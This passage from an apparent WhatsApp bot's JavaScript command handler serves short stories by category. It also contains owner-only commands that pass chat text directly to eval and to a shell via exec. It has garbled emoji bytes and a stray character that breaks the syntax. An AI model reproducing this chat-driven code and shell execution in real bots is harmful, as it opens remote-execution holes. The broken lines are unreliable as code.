reply(`�? _*Title :*_ ${jptoyk.title}\n�? _*Author :*_ ${jptoyk.author}\n�? _*Category :*_ ${jptoyk.kategori}\n�? _*Pass Moderation :*_ ${jptoyk.lolos}\n�? _*Story :*_\n${jptoyk.cerita}`)
}
break
case 'cerpen_petualangan':{
if (!isPrem) return replyprem(mess.premium)
let qwers = await cerpen(`petualangan`)
reply(`�? _*Title :*_ ${qwers.title}\n�? _*Author :*_ ${qwers.author}\n�? _*Category :*_ ${qwers.kategori}\n�? _*Pass Moderation :*_ ${qwers.lolos}\n�? _*Story :*_\n${qwers.cerita}`)
}
break
case 'cerpen_ramadhan':{
if (!isPrem) return replyprem(mess.premium)
let vrmfkk = await cerpen(`ramadhan`)
reply(`�? _*Title :*_ ${vrmfkk.title}\n�? _*Author :*_ ${vrmfkk.author}\n�? _*Category :*_ ${vrmfkk.kategori}\n�? _*Pass Moderation :*_ ${vrmfkk.lolos}\n�? _*Story :*_\n${vrmfkk.cerita}`)
}
break
case 'cerpen_remaja':{
if (!isPrem) return replyprem(mess.premium)
let vhptotk = await cerpen(`remaja`)
reply(`�? _*Title :*_ ${vhptotk.title}\n�? _*Author :*_ ${vhptotk.author}\n�? _*Category :*_ ${vhptotk.kategori}\n�? _*Pass Moderation :*_ ${vhptotk.lolos}\n�? _*Story :*_\n${vhptotk.cerita}`)
}
break
case 'cerpen_rindu':{
if (!isPrem) return replyprem(mess.premium)
let hptotlltk = await cerpen(`rindu`)
reply(`�? _*Title :*_ ${hptotlltk.title}\n�? _*Author :*_ ${hptotlltk.author}\n�? _*Category :*_ ${hptotlltk.kategori}\n�? _*Pass Moderation :*_ ${hptotlltk.lolos}\n�? _*Story :*_\n${hptotlltk.cerita}`)
}
break
case 'cerpen_rohani':{
if (!isPrem) return replyprem(mess.premium)
let zaldjdws = await cerpen(`rohani`)
reply(`�? _*Title :*_ ${zaldjdws.title}\n�? _*Author :*_ ${zaldjdws.author}\n�? _*Category :*_ ${zaldjdws.kategori}\n�? _*Pass Moderation :*_ ${zaldjdws.lolos}\n�? _*Story :*_\n${zaldjdws.cerita}`)
}
break
case 'cerpen_romantis':{
if (!isPrem) return replyprem(mess.premium)
let lxprhrh = await cerpen(`romantis`)
reply(`�? _*Title :*_ ${lxprhrh.title}\n�? _*Author :*_ ${lxprhrh.author}\n�? _*Category :*_ ${lxprhrh.kategori}\n�? _*Pass Moderation :*_ ${lxprhrh.lolos}\n�? _*Story :*_\n${lxprhrh.cerita}`)
}
break
case 'cerpen_sastra':{
if (!isPrem) return replyprem(mess.premium)
let qpifker = await cerpen(`sastra`)
reply(`�? _*Title :*_ ${qpifker.title}\n�? _*Author :*_ ${qpifker.author}\n�? _*Category :*_ ${qpifker.kategori}\n�? _*Pass Moderation :*_ ${qpifker.lolos}\n�? _*Story :*_\n${qpifker.cerita}`)
}
break
case 'cerpen_sedih':{
if (!isPrem) return replyprem(mess.premium)
let bmflgkjt = await cerpen(`sedih`)
reply(`�? _*Title :*_ ${bmflgkjt.title}\n�? _*Author :*_ ${bmflgkjt.author}\n�? _*Category :*_ ${bmflgkjt.kategori}\n�? _*Pass Moderation :*_ ${bmflgkjt.lolos}\n�? _*Story :*_\n${bmflgkjt.cerita}`)
}
break
case 'cerpen_sejarah':{
if (!isPrem) return replyprem(mess.premium)
let xwpwifj = await cerpen(`sejarah`)
reply(`�? _*Title :*_ ${xwpwifj.title}\n�? _*Author :*_ ${xwpwifj.author}\n�? _*Category :*_ ${xwpwifj.kategori}\n�? _*Pass Moderation :*_ ${xwpwifj.lolos}\n�? _*Story :*_\n${xwpwifj.cerita}`)
}
break
case '>':
case '=>':
if (!itsMeGpStore) return;
var err = new TypeError;
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return reply(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
reply(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
reply(util.format(_syntax + _err))
}
break
default:
if (budy.startsWith('<')) {
if (!itsMeGpStore) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('vv')) {
if (!itsMeGpStore) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!itsMeGpStore) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
GpStore.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
GpStore.sendMessage("62858428854987@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true𝙭
}})
}
}
